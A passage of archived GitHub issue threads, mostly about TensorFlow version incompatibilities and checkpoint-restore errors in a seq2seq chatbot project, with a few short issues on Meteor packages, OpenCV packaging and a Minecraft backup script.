    238     memo[id(x)] = y&#13;
    239     for key, value in x.items():&#13;
--&gt; 240         y[deepcopy(key, memo)] = deepcopy(value, memo)&#13;
    241     return y&#13;
    242 d[dict] = _deepcopy_dict&#13;
&#13;
/Users/dexter/anaconda/lib/python3.6/copy.py in deepcopy(x, memo, _nil)&#13;
    178                     y = x&#13;
    179                 else:&#13;
--&gt; 180                     y = _reconstruct(x, memo, *rv)&#13;
    181 &#13;
    182     # If is its own copy, don't memoize.&#13;
&#13;
/Users/dexter/anaconda/lib/python3.6/copy.py in _reconstruct(x, memo, func, args, state, listiter, dictiter, deepcopy)&#13;
    278     if state is not None:&#13;
    279         if deep:&#13;
--&gt; 280             state = deepcopy(state, memo)&#13;
    281         if hasattr(y, '__setstate__'):&#13;
    282             y.__setstate__(state)&#13;
&#13;
/Users/dexter/anaconda/lib/python3.6/copy.py in deepcopy(x, memo, _nil)&#13;
    148     copier = _deepcopy_dispatch.get(cls)&#13;
    149     if copier:&#13;
--&gt; 150         y = copier(x, memo)&#13;
    151     else:&#13;
    152         try:&#13;
&#13;
/Users/dexter/anaconda/lib/python3.6/copy.py in _deepcopy_dict(x, memo, deepcopy)&#13;
    238     memo[id(x)] = y&#13;
    239     for key, value in x.items():&#13;
--&gt; 240         y[deepcopy(key, memo)] = deepcopy(value, memo)&#13;
    241     return y&#13;
    242 d[dict] = _deepcopy_dict&#13;
&#13;
/Users/dexter/anaconda/lib/python3.6/copy.py in deepcopy(x, memo, _nil)&#13;
    167                     reductor = getattr(x, "__reduce_ex__", None)&#13;
    168                     if reductor:&#13;
--&gt; 169                         rv = reductor(4)&#13;
    170                     else:&#13;
    171                         reductor = getattr(x, "__reduce__", None)&#13;
&#13;
TypeError: can't pickle _thread.lock objects</Body>
    </Comment>
    <Comment>
      <Owner>Jatapiaro</Owner>
      <Body>I found a solution for it. You should check my code https://github.com/Jatapiaro/TwinkerBot_Revival&#13;
Twitter traning starts the bot training, that's where I got the error. Copy paste my seq2seq_wrapper code, use python 3 and please use tensorflow 1.0.0</Body>
    </Comment>
    <Comment>
      <Owner>dexterchan</Owner>
      <Body>then I receive this... thank you&#13;
&lt;log&gt; Building Graph &#13;
---------------------------------------------------------------------------&#13;
AttributeError                            Traceback (most recent call last)&#13;
&lt;ipython-input-6-27a584e39e51&gt; in &lt;module&gt;()&#13;
      5                                ckpt_path='ckpt/twitter/',&#13;
      6                                emb_dim=emb_dim,&#13;
----&gt; 7                                num_layers=3&#13;
      8                                )&#13;
&#13;
/Users/dexter/Downloads/TensorFlowTutorial/TwinkerBot_Revival-master/seq2seq_wrapper.py in __init__(self, xseq_len, yseq_len, xvocab_size, yvocab_size, emb_dim, num_layers, ckpt_path, lr, epochs, model_name)&#13;
     76         sys.stdout.write('&lt;log&gt; Building Graph ')&#13;
     77         # build comput graph&#13;
---&gt; 78         __graph__()&#13;
     79         sys.stdout.write('&lt;/log&gt;')&#13;
     80 &#13;
&#13;
/Users/dexter/Downloads/TensorFlowTutorial/TwinkerBot_Revival-master/seq2seq_wrapper.py in __graph__()&#13;
     39             self.keep_prob = tf.placeholder(tf.float32)&#13;
     40             # define the basic cell&#13;
---&gt; 41             basic_cell = tf.contrib.rnn.core_rnn_cell.DropoutWrapper(&#13;
     42                 tf.contrib.rnn.core_rnn_cell.BasicLSTMCell(emb_dim, state_is_tuple=True),&#13;
     43                 output_keep_prob=self.keep_prob)&#13;
&#13;
AttributeError: module 'tensorflow.contrib.rnn' has no attribute 'core_rnn_cell'&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>Jatapiaro</Owner>
      <Body>@dexterchan Are you shure that you're using Tensorflow 1.0.0 and python3?&#13;
You can check your tensorflow version using the command below: &#13;
python3 -c "import tensorflow as tf; print(tf.__version__)"</Body>
    </Comment>
    <Comment>
      <Owner>dexterchan</Owner>
      <Body>Sorry, forget to upgrade my tensorflow.... it is running training now... thank you for your support....  :)</Body>
    </Comment>
    <Comment>
      <Owner>Jatapiaro</Owner>
      <Body>@dexterchan You're welcome :) &#13;
And please be careful with this https://github.com/suriyadeepan/practical_seq2seq/issues/2 &#13;
I recommend you to left your training running as most as you can, I've lost one day  trying to restore sessions but it doesn't work, for some reason begins again. </Body>
    </Comment>
    <Comment>
      <Owner>Sayan98</Owner>
      <Body>To anyone trying to run `python3 -c "import tensorflow as tf; print(tf.version)"`, you'll get a `AttributeError`, `version` has been renamed to `VERSION`, so, now you've to run `python3 -c "import tensorflow as tf; print(tf.VERSION)"`</Body>
    </Comment>
    <Comment>
      <Owner>anthdm</Owner>
      <Body>Using Tensorflow 1.0.0 fix this issue. &#13;
To downgrade the gpu version `pip3 install tensorflow-gpu==1.0.0`&#13;
To downgrade the cpu version `pip3 install tensorflow==1.0.0`</Body>
    </Comment>
    <Comment>
      <Owner>Macintoshxz</Owner>
      <Body>@anthdm Thank you ! That works for me! Downgrade the Tensorflow to 1.0.0. &#13;
</Body>
    </Comment>
    <Comment>
      <Owner>LilyDreamZhao</Owner>
      <Body>Is there any other way ?I wouldn't downgrade the tensorflow to 1.0.0</Body>
    </Comment>
  </Issue_700>
  <Issue_701>
    <Repository>practical_seq2seq</Repository>
    <Title>tensorflow 1.0</Title>
    <Owner>suriyadeepan</Owner>
    <Body>The codebase is not working with tensorflow 1.0. What is the best way to make it compatible?</Body>
    <State>open</State>
    <Comment>
      <Owner>jshin49</Owner>
      <Body>I am getting the same problem, and it doesn't even work with TF 0.12.1 as the code apparently seems to use TF1.0 API</Body>
    </Comment>
    <Comment>
      <Owner>alyssaong1</Owner>
      <Body>To downgrade: &#13;
conda create -n tensorflow1.0 python=3.5&#13;
source activate tensorflow1.0&#13;
pip install tensorflow==1.0&#13;
&#13;
Best to create a virtualenv first :)</Body>
    </Comment>
  </Issue_701>
  <Issue_702>
    <Repository>practical_seq2seq</Repository>
    <Title>Restore last session for training</Title>
    <Owner>suriyadeepan</Owner>
    <Body>Hi,&#13;
&#13;
What would be the way to restore session from last training?&#13;
&#13;
I tried the code as below, but it shows the cpkt saving to 1000 instead of the number i have in the cpkt folder.&#13;
&#13;
print('\nRestoring session...')&#13;
sess = model.restore_last_session()&#13;
print('\nTraining...')&#13;
sess = model.train(train_batch_gen, val_batch_gen, sess)&#13;
&#13;
Thanks.&#13;
Ken</Body>
    <State>open</State>
    <Comment>
      <Owner>Jatapiaro</Owner>
      <Body>Did you find a solution? </Body>
    </Comment>
    <Comment>
      <Owner>Jatapiaro</Owner>
      <Body>@suriyadeepan Same issue, I have tried everything, but it simple starts from scratch.&#13;
@kenyeung128 did you find a solution? https://github.com/suriyadeepan/practical_seq2seq/issues/2 Doesn't work </Body>
    </Comment>
  </Issue_702>
  <Issue_703>
    <Repository>practical_seq2seq</Repository>
    <Title>Error running the twitter dataset bot after reloading checkpoint.</Title>
    <Owner>suriyadeepan</Owner>
    <Body>I am getting the error shown below after I run the model.predict() line in the twitter chatbot ipynb. &#13;
&#13;
After some searching online I found that this happens when the variables are not initialized, but I am just trying to run your pre-trained model to see how it works.&#13;
&#13;
Is there something I should be doing that's different ? Should I train before I run?&#13;
&#13;
```&#13;
---------------------------------------------------------------------------&#13;
FailedPreconditionError                   Traceback (most recent call last)&#13;
/Users/ybow_93/anaconda/lib/python3.5/site-packages/tensorflow/python/client/session.py in _do_call(self, fn, *args)&#13;
    971     try:&#13;
--&gt; 972       return fn(*args)&#13;
    973     except errors.OpError as e:&#13;
&#13;
/Users/ybow_93/anaconda/lib/python3.5/site-packages/tensorflow/python/client/session.py in _run_fn(session, feed_dict, fetch_list, target_list, options, run_metadata)&#13;
    953                                  feed_dict, fetch_list, target_list,&#13;
--&gt; 954                                  status, run_metadata)&#13;
    955 &#13;
&#13;
/Users/ybow_93/anaconda/lib/python3.5/contextlib.py in __exit__(self, type, value, traceback)&#13;
     65             try:&#13;
---&gt; 66                 next(self.gen)&#13;
     67             except StopIteration:&#13;
&#13;
/Users/ybow_93/anaconda/lib/python3.5/site-packages/tensorflow/python/framework/errors.py in raise_exception_on_not_ok_status()&#13;
    462           compat.as_text(pywrap_tensorflow.TF_Message(status)),&#13;
--&gt; 463           pywrap_tensorflow.TF_GetCode(status))&#13;
    464   finally:&#13;
&#13;
FailedPreconditionError: Attempting to use uninitialized value decoder/embedding_rnn_seq2seq/embedding_rnn_decoder/rnn_decoder/OutputProjectionWrapper/Linear/Bias&#13;
  [[Node: decoder/embedding_rnn_seq2seq/embedding_rnn_decoder/rnn_decoder/OutputProjectionWrapper/Linear/Bias/read = Identity[T=DT_FLOAT, _class=["loc:@decoder/embedding_rnn_seq2seq/embedding_rnn_decoder/rnn_decoder/OutputProjectionWrapper/Linear/Bias"], _device="/job:localhost/replica:0/task:0/cpu:0"](decoder/embedding_rnn_seq2seq/embedding_rnn_decoder/rnn_decoder/OutputProjectionWrapper/Linear/Bias)]]&#13;
&#13;
During handling of the above exception, another exception occurred:&#13;
&#13;
FailedPreconditionError                   Traceback (most recent call last)&#13;
&lt;ipython-input-32-6ce101760870&gt; in &lt;module&gt;()&#13;
      1 #sess.run(tf.initialize_all_variables())&#13;
      2 input_ = test_batch_gen.__next__()[0]&#13;
----&gt; 3 output = model.predict(sess, input_)&#13;
      4 print(output.shape)&#13;
&#13;
/Users/ybow_93/Deep and Machine Learning/Retrieval Based Chatbot/practical_seq2seq-master/seq2seq_wrapper.py in predict(self, sess, X)&#13;
    173         feed_dict = {self.enc_ip[t]: X[t] for t in range(self.xseq_len)}&#13;
    174         feed_dict[self.keep_prob] = 1.&#13;
--&gt; 175         dec_op_v = sess.run(self.decode_outputs_test, feed_dict)&#13;
    176         # dec_op_v is a list; also need to transpose 0,1 indices&#13;
    177         #  (interchange batch_size and timesteps dimensions&#13;
&#13;
/Users/ybow_93/anaconda/lib/python3.5/site-packages/tensorflow/python/client/session.py in run(self, fetches, feed_dict, options, run_metadata)&#13;
    715     try:&#13;
    716       result = self._run(None, fetches, feed_dict, options_ptr,&#13;
--&gt; 717                          run_metadata_ptr)&#13;
    718       if run_metadata:&#13;
    719         proto_data = tf_session.TF_GetBuffer(run_metadata_ptr)&#13;
&#13;
/Users/ybow_93/anaconda/lib/python3.5/site-packages/tensorflow/python/client/session.py in _run(self, handle, fetches, feed_dict, options, run_metadata)&#13;
    913     if final_fetches or final_targets:&#13;
    914       results = self._do_run(handle, final_targets, final_fetches,&#13;
--&gt; 915                              feed_dict_string, options, run_metadata)&#13;
    916     else:&#13;
    917       results = []&#13;
&#13;
/Users/ybow_93/anaconda/lib/python3.5/site-packages/tensorflow/python/client/session.py in _do_run(self, handle, target_list, fetch_list, feed_dict, options, run_metadata)&#13;
    963     if handle is None:&#13;
    964       return self._do_call(_run_fn, self._session, feed_dict, fetch_list,&#13;
--&gt; 965                            target_list, options, run_metadata)&#13;
    966     else:&#13;
    967       return self._do_call(_prun_fn, self._session, handle, feed_dict,&#13;
&#13;
/Users/ybow_93/anaconda/lib/python3.5/site-packages/tensorflow/python/client/session.py in _do_call(self, fn, *args)&#13;
    983         except KeyError:&#13;
    984           pass&#13;
--&gt; 985       raise type(e)(node_def, op, message)&#13;
    986 &#13;
    987   def _extend_graph(self):&#13;
&#13;
FailedPreconditionError: Attempting to use uninitialized value decoder/embedding_rnn_seq2seq/embedding_rnn_decoder/rnn_decoder/OutputProjectionWrapper/Linear/Bias&#13;
  [[Node: decoder/embedding_rnn_seq2seq/embedding_rnn_decoder/rnn_decoder/OutputProjectionWrapper/Linear/Bias/read = Identity[T=DT_FLOAT, _class=["loc:@decoder/embedding_rnn_seq2seq/embedding_rnn_decoder/rnn_decoder/OutputProjectionWrapper/Linear/Bias"], _device="/job:localhost/replica:0/task:0/cpu:0"](decoder/embedding_rnn_seq2seq/embedding_rnn_decoder/rnn_decoder/OutputProjectionWrapper/Linear/Bias)]]&#13;
&#13;
Caused by op 'decoder/embedding_rnn_seq2seq/embedding_rnn_decoder/rnn_decoder/OutputProjectionWrapper/Linear/Bias/read', defined at:&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/runpy.py", line 184, in _run_module_as_main&#13;
    "__main__", mod_spec)&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/runpy.py", line 85, in _run_code&#13;
    exec(code, run_globals)&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/ipykernel/__main__.py", line 3, in &lt;module&gt;&#13;
    app.launch_new_instance()&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/traitlets/config/application.py", line 658, in launch_instance&#13;
    app.start()&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/ipykernel/kernelapp.py", line 474, in start&#13;
    ioloop.IOLoop.instance().start()&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/zmq/eventloop/ioloop.py", line 177, in start&#13;
    super(ZMQIOLoop, self).start()&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/tornado/ioloop.py", line 887, in start&#13;
    handler_func(fd_obj, events)&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/tornado/stack_context.py", line 275, in null_wrapper&#13;
    return fn(*args, **kwargs)&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/zmq/eventloop/zmqstream.py", line 440, in _handle_events&#13;
    self._handle_recv()&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/zmq/eventloop/zmqstream.py", line 472, in _handle_recv&#13;
    self._run_callback(callback, msg)&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/zmq/eventloop/zmqstream.py", line 414, in _run_callback&#13;
    callback(*args, **kwargs)&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/tornado/stack_context.py", line 275, in null_wrapper&#13;
    return fn(*args, **kwargs)&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/ipykernel/kernelbase.py", line 276, in dispatcher&#13;
    return self.dispatch_shell(stream, msg)&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/ipykernel/kernelbase.py", line 228, in dispatch_shell&#13;
    handler(stream, idents, msg)&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/ipykernel/kernelbase.py", line 390, in execute_request&#13;
    user_expressions, allow_stdin)&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/ipykernel/ipkernel.py", line 196, in do_execute&#13;
    res = shell.run_cell(code, store_history=store_history, silent=silent)&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/ipykernel/zmqshell.py", line 501, in run_cell&#13;
    return super(ZMQInteractiveShell, self).run_cell(*args, **kwargs)&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/IPython/core/interactiveshell.py", line 2717, in run_cell&#13;
    interactivity=interactivity, compiler=compiler, result=result)&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/IPython/core/interactiveshell.py", line 2821, in run_ast_nodes&#13;
    if self.run_code(code, result):&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/IPython/core/interactiveshell.py", line 2881, in run_code&#13;
    exec(code_obj, self.user_global_ns, self.user_ns)&#13;
  File "&lt;ipython-input-29-27a584e39e51&gt;", line 7, in &lt;module&gt;&#13;
    num_layers=3&#13;
  File "/Users/ybow_93/Deep and Machine Learning/Retrieval Based Chatbot/practical_seq2seq-master/seq2seq_wrapper.py", line 79, in __init__&#13;
    __graph__()&#13;
  File "/Users/ybow_93/Deep and Machine Learning/Retrieval Based Chatbot/practical_seq2seq-master/seq2seq_wrapper.py", line 58, in __graph__&#13;
    xvocab_size, yvocab_size, emb_dim)&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/tensorflow/python/ops/seq2seq.py", line 357, in embedding_rnn_seq2seq&#13;
    feed_previous=feed_previous)&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/tensorflow/python/ops/seq2seq.py", line 280, in embedding_rnn_decoder&#13;
    loop_function=loop_function)&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/tensorflow/python/ops/seq2seq.py", line 146, in rnn_decoder&#13;
    output, state = cell(inp, state)&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/tensorflow/python/ops/rnn_cell.py", line 587, in __call__&#13;
    projected = _linear(output, self._output_size, True)&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/tensorflow/python/ops/rnn_cell.py", line 914, in _linear&#13;
    bias_start, dtype=dtype))&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/tensorflow/python/ops/variable_scope.py", line 1022, in get_variable&#13;
    custom_getter=custom_getter)&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/tensorflow/python/ops/variable_scope.py", line 849, in get_variable&#13;
    custom_getter=custom_getter)&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/tensorflow/python/ops/variable_scope.py", line 345, in get_variable&#13;
    validate_shape=validate_shape)&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/tensorflow/python/ops/variable_scope.py", line 330, in _true_getter&#13;
    caching_device=caching_device, validate_shape=validate_shape)&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/tensorflow/python/ops/variable_scope.py", line 676, in _get_single_variable&#13;
    validate_shape=validate_shape)&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/tensorflow/python/ops/variables.py", line 215, in __init__&#13;
    dtype=dtype)&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/tensorflow/python/ops/variables.py", line 327, in _init_from_args&#13;
    self._snapshot = array_ops.identity(self._variable, name="read")&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/tensorflow/python/ops/gen_array_ops.py", line 1128, in identity&#13;
    result = _op_def_lib.apply_op("Identity", input=input, name=name)&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/tensorflow/python/framework/op_def_library.py", line 749, in apply_op&#13;
    op_def=op_def)&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/tensorflow/python/framework/ops.py", line 2380, in create_op&#13;
    original_op=self._default_original_op, op_def=op_def)&#13;
  File "/Users/ybow_93/anaconda/lib/python3.5/site-packages/tensorflow/python/framework/ops.py", line 1298, in __init__&#13;
    self._traceback = _extract_stack()&#13;
&#13;
FailedPreconditionError (see above for traceback): Attempting to use uninitialized value decoder/embedding_rnn_seq2seq/embedding_rnn_decoder/rnn_decoder/OutputProjectionWrapper/Linear/Bias&#13;
  [ [ Node: decoder/embedding_rnn_seq2seq/embedding_rnn_decoder/rnn_decoder/OutputProjectionWrapper/Linear/Bias/read = Identity[T=DT_FLOAT, _class=[ "loc:@decoder/embedding_rnn_seq2seq/embedding_rnn_decoder/rnn_decoder/OutputProjectionWrapper/Linear/Bias"], _device="/job:localhost/replica:0/task:0/cpu:0" ](decoder/embedding_rnn_seq2seq/embedding_rnn_decoder/rnn_decoder/OutputProjectionWrapper/Linear/Bias ) ] ]&#13;
```&#13;
&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>mandarbandodekar</Owner>
      <Body>I am having the exact same error!! Did u resolve it?</Body>
    </Comment>
    <Comment>
      <Owner>GreatKarollo</Owner>
      <Body>have you guys manage to find the solution ? &#13;
I tried `initialize_all_variables` and `graph root` but no success so far ? Do you think it is to do with TF 1.4 breaking compatibly with previous vs?</Body>
    </Comment>
    <Comment>
      <Owner>nunezpaul</Owner>
      <Body>Hey I was having this problem too. The problem is you're likely not importing the ckpt files.&#13;
&#13;
Turns out that running the code straight will not give you an error if you haven't actually loaded the checkpoint file since the code will skip over the loading if it doesn't find the files.&#13;
&#13;
&#13;
     def restore_last_session(self):&#13;
        saver = tf.train.Saver()&#13;
        # create a session&#13;
        sess = tf.Session()&#13;
        # get checkpoint state&#13;
        ckpt = tf.train.get_checkpoint_state(self.ckpt_path) &#13;
        # restore session&#13;
        if ckpt and ckpt.model_checkpoint_path: [&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&#13;
            saver.restore(sess, ckpt.model_checkpoint_path)&#13;
        # return to user&#13;
        return sess&#13;
&#13;
&#13;
To fix it this issue, you need to do either one of the following after pulling and decompressing the model.&#13;
&#13;
1) make sure to either have all the ckpt files directly in the ckpt folder &#13;
2) modify the ckpt_path (line 29 in chatbot.py) to be&#13;
&#13;
    `ckpt = 'ckpt/seq2seq_twitter_1024x3h_i43000'`&#13;
&#13;
*assuming that your uncompressed folder is named the same as mine. If not then change seq2seq_twitter_1024x3h_i43000 to whatever you've named it.&#13;
&#13;
That solved my problem and will likely fix yours.</Body>
    </Comment>
    <Comment>
      <Owner>singhgurjyot</Owner>
      <Body>Hey nunezpaul, I did what you said but it still gives me some NotFoundError, I am running python 3.5.4 and tensorflow 1.0.0&#13;
&#13;
Here is the error:&#13;
NotFoundError (see above for traceback): Key decoder/embedding_rnn_seq2seq/embedding_rnn_decoder/rnn_decoder/multi_rnn_cell/cell_1/basic_lstm_cell/biases/Adam_1 not found in checkpoint&#13;
  [[Node: save/RestoreV2_13 = RestoreV2[dtypes=[DT_FLOAT], _device="/job:localhost/replica:0/task:0/cpu:0"](_recv_save/Const_0, save/RestoreV2_13/tensor_names, save/RestoreV2_13/shape_and_slices)]]</Body>
    </Comment>
  </Issue_703>
  <Issue_704>
    <Repository>practical_seq2seq</Repository>
    <Title>Importing using the last check point</Title>
    <Owner>suriyadeepan</Owner>
    <Body> Attempting to use uninitialized value decoder/embedding_rnn_seq2seq/embedding_rnn_decoder/embedding/Adam_1&#13;
  [[Node: decoder/embedding_rnn_seq2seq/embedding_rnn_decoder/embedding/Adam_1/read = Identity[T=DT_FLOAT, _class=["loc:@decoder/embedding_rnn_seq2seq/embedding_rnn_decoder/embedding"], _device="/job:localhost/replica:0/task:0/cpu:0"](decoder/embedding_rnn_seq2seq/embedding_rnn_decoder/embedding/Adam_1)]]&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>superMDguy</Owner>
      <Body>I'm having the same issue.</Body>
    </Comment>
    <Comment>
      <Owner>rojansudev</Owner>
      <Body>Me too.Anybody got the fix?</Body>
    </Comment>
    <Comment>
      <Owner>nunezpaul</Owner>
      <Body>Hey I was having this problem too. The problem is you're likely not importing the ckpt files.&#13;
&#13;
Turns out that running the code straight will not give you an error if you haven't actually loaded the checkpoint file since the code will skip over the loading if it doesn't find the files.&#13;
&#13;
&#13;
     def restore_last_session(self):&#13;
        saver = tf.train.Saver()&#13;
        # create a session&#13;
        sess = tf.Session()&#13;
        # get checkpoint state&#13;
        ckpt = tf.train.get_checkpoint_state(self.ckpt_path) &#13;
        # restore session&#13;
        if ckpt and ckpt.model_checkpoint_path: [&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&#13;
            saver.restore(sess, ckpt.model_checkpoint_path)&#13;
        # return to user&#13;
        return sess&#13;
&#13;
&#13;
To fix it this issue, you need to do either one of the following after pulling and decompressing the model.&#13;
&#13;
1) make sure to either have all the ckpt files directly in the ckpt folder &#13;
2) modify the ckpt_path (line 29 in chatbot.py) to be&#13;
&#13;
    `ckpt = 'ckpt/seq2seq_twitter_1024x3h_i43000'`&#13;
&#13;
*assuming that your uncompressed folder is named the same as mine. If not then change seq2seq_twitter_1024x3h_i43000 to whatever you've named it.&#13;
&#13;
That solved my problem and will likely fix yours.</Body>
    </Comment>
  </Issue_704>
  <Issue_705>
    <Repository>practical_seq2seq</Repository>
    <Title>about padding</Title>
    <Owner>suriyadeepan</Owner>
    <Body>Hi, thanks to your project.&#13;
In your code, i haven't seen any code for processing the padding in the data. Does that make sense? I see in many other work they will call a function that map the pad index to zero embedding and throw away the  loss value for padding sequences.</Body>
    <State>open</State>
    <Comment>
      <Owner>suriyadeepan</Owner>
      <Body>@chenwangliangguo Ah. I missed it. We need to manipulate *loss_weights*, to set zero weights corresponding to zero padded positions. I'll work on it asap.&#13;
&#13;
```python&#13;
loss_weights = [ tf.ones_like(label, dtype=tf.float32) for label in self.labels ]&#13;
self.loss = tf.nn.seq2seq.sequence_loss(self.decode_outputs, self.labels, loss_weights, yvocab_size)&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>XianhuiLin</Owner>
      <Body>loss_weights = [ tf.ones_like(label, dtype=tf.float32) for label in self.labels ]&#13;
self.loss = tf.nn.seq2seq.sequence_loss(self.decode_outputs, self.labels, loss_weights, yvocab_size)&#13;
&#13;
what's the meaning? and "yvocab_size" is used for what?</Body>
    </Comment>
  </Issue_705>
  <Issue_706>
    <Repository>vivisecto</Repository>
    <Title>Use of local opencv libraries</Title>
    <Owner>suriyadeepan</Owner>
    <Body>- Instead of downloading the opencv libraries (libopencv-*), pack the libraries along with the repository
- Make sure to add i686 and x86_64 support
</Body>
    <State>open</State>
    <Comment>
      <Owner>suriyadeepan</Owner>
      <Body>Required libraries
  -lopencv_core -lopencv_imgproc -lopencv_highgui 

@vanangamudi need help here!!
</Body>
    </Comment>
    <Comment>
      <Owner>vanangamudi</Owner>
      <Body>I understand that you mean to add opencv lib to the vivisecto repo itself. We should edit out make files to build opencv with all flags to support i686 and x64(are they not mutually exclusive?) build, and change the environemnt variables to make the build toolchain to pickup the local one instead of the one which is installed from online repo.
</Body>
    </Comment>
    <Comment>
      <Owner>vanangamudi</Owner>
      <Body>Or we could edit just the build tools env variables to use already locally precompiled libraries. Just like we add .jar files to java projects.
</Body>
    </Comment>
  </Issue_706>
  <Issue_707>
    <Repository>meteor-stripe-native</Repository>
    <Title>Added missing object param for listSubscriptions</Title>
    <Owner>benjick</Owner>
    <Body>Couldn't send any params for listSubscriptions. This fixes that.</Body>
    <State>open</State>
    <Comment>
      <Owner>benjick</Owner>
      <Body>Hey sorry. Didn't see this. Is this needed? I don't think this package is compatible with newer versions of Meteor. If so, can you fix the test failing?</Body>
    </Comment>
  </Issue_707>
  <Issue_708>
    <Repository>meteor-telegram-bot</Repository>
    <Title>use first_name if username is undefined</Title>
    <Owner>benjick</Owner>
    <Body>use first_name for fromUsername if username is undefined</Body>
    <State>open</State>
    <Comment>
      <Owner>benjick</Owner>
      <Body>@shrmnk This looks good to me</Body>
    </Comment>
    <Comment>
      <Owner>NickBusey</Owner>
      <Body>@benjick I just ran into this bug. Any chance on getting it merged?</Body>
    </Comment>
  </Issue_708>
  <Issue_709>
    <Repository>meteor-telegram-bot</Repository>
    <Title>Error on startup</Title>
    <Owner>benjick</Owner>
    <Body>You can get this error on startup that will stop your entire Meteor app from running:

```
W20160905-14:58:06.877(3)? (STDERR) TypeError: Cannot read property '401' of undefined
W20160905-14:58:06.878(3)? (STDERR)     at packages/benjick:telegram-bot/telegram-bot.js:92:21
W20160905-14:58:06.878(3)? (STDERR)     at Array.map (native)
W20160905-14:58:06.878(3)? (STDERR)     at Object.TelegramBot.parsePollResult (packages/benjick:telegram-bot/telegram-bot.js:45:7)
W20160905-14:58:06.879(3)? (STDERR)     at Object.TelegramBot.poll (packages/benjick:telegram-bot/telegram-bot.js:32:15)
W20160905-14:58:06.879(3)? (STDERR)     at Object.TelegramBot.start (packages/benjick:telegram-bot/telegram-bot.js:36:14)
```

I'm going to look into it now. To get to the situation is an edge case and I think I got here from sending Telegram a bad request, but either way this shouldn't crash the entire app.
</Body>
    <State>open</State>
    <Comment>
      <Owner>elie222</Owner>
      <Body>I made a pull request to fix this issue here: https://github.com/benjick/meteor-telegram-bot/pull/32
</Body>
    </Comment>
  </Issue_709>
  <Issue_710>
    <Repository>meteor-telegram-bot</Repository>
    <Title>End Conversation with command dispatch.</Title>
    <Owner>benjick</Owner>
    <Body>Hello everybody. I'm trying to handle the case when the user terminates the listener with another register command. For example, if I'm in progress of the command _/new_ and send another command, such as _/list_. What I need to do is:

```
TelegramBot.endConversation(&#8230;);
TelegramBot.send('/list.', &#8230;);
```

The problem is when I `endConversation`, the `.send` command doesn't work. Yes, it sends a message _/list_, but it doesn't initiate `TelegramBot.addListener('/list', &#8230;)`.

Could you suggest how to solve this?
</Body>
    <State>open</State>
    <Comment>
      <Owner>shrmnk</Owner>
      <Body>Hey man, I got your email. I'll check on this case tomorrow when I can finally get my computer working (been working off my phone because of a failed SSD).

Just to clarify - you had previously set up a listener on /list and then started a conversation? And now, you want it such that a specific command (/new) would end the conversation and revert back to the listener's handler?
</Body>
    </Comment>
  </Issue_710>
  <Issue_711>
    <Repository>Minecraft-Autobackup</Repository>
    <Title>Multiple worlds</Title>
    <Owner>benjick</Owner>
    <Body>Hi! 

Nice script and it works smoothly for me.

But i need a little help, I have 2 worlds that i need backup of and this one only works whit the world from server.pro...

Can you help? 

Regards Mihai
</Body>
    <State>open</State>
    <Comment>
      <Owner>benjick</Owner>
      <Body>Hey, this is a bit old script. How can you have two worlds? Haven't played minecraft in a while
</Body>
    </Comment>
    <Comment>
      <Owner>Mihaion</Owner>
      <Body>Hi!  

Thenx for reply! I found this http://wiki.ess3.net/wiki/Backup

it is a plugin Multiverse-core...whit it you can have to or more wolds. 

:+1: 
</Body>
    </Comment>
  </Issue_711>
  <Issue_712>
    <Repository>Minecraft-Autobackup</Repository>
    <Title>World in subfolder breaks script</Title>
    <Owner>benjick</Owner>
    <Body>My `level-name` is `HSH/Home`

tar tries to create a file wich doesn't exists.

i quick fix my probleme using sed :
`WORLDTOTAR=$(echo $WORLD | sed 's/\//_/g')`
and pass new world name to tar

```
BFILE="$WORLDTOTAR.$STAMP.tar.gz"
CMD="tar -czf $FINALDIR/$BFILE $WORLD
```

Maybe this is not the best way.

This is for backup_server.sh
</Body>
    <State>open</State>
    <Comment>
      <Owner>benjick</Owner>
      <Body>Hey man. Didn't know you could have slashes in worldnames. Thanks for the fix, I'll test it and put it in
</Body>
    </Comment>
